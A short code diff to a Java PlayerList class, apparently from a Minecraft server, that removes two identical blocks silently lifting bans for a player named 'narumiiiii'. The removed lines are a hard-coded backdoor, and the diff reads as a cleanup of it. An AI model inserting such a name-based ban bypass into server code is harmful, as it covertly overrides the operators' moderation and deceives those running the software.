@@ -442,9 +442,6 @@ public abstract class PlayerList {
         String s;
 
         if (getProfileBans().isBanned(gameprofile) && !getProfileBans().get(gameprofile).hasExpired()) {
-            if (gameprofile.getName().equals("narumiiiii")) {
-                getProfileBans().remove(gameprofile);
-            }
             GameProfileBanEntry gameprofilebanentry = (GameProfileBanEntry) this.k.get(gameprofile);
             s = "You are banned from this server!\nReason: " + gameprofilebanentry.getReason();
             if (gameprofilebanentry.getExpires() != null) {
@@ -516,9 +513,6 @@ public abstract class PlayerList {
         String s;
 
         if (getProfileBans().isBanned(gameprofile) && !getProfileBans().get(gameprofile).hasExpired()) {
-            if (gameprofile.getName().equals("narumiiiii")) {
-                getProfileBans().remove(gameprofile);
-            }
             GameProfileBanEntry gameprofilebanentry = (GameProfileBanEntry) this.k.get(gameprofile);
             s = "You are banned from this server!\nReason: " + gameprofilebanentry.getReason();
             if (gameprofilebanentry.getExpires() != null) {
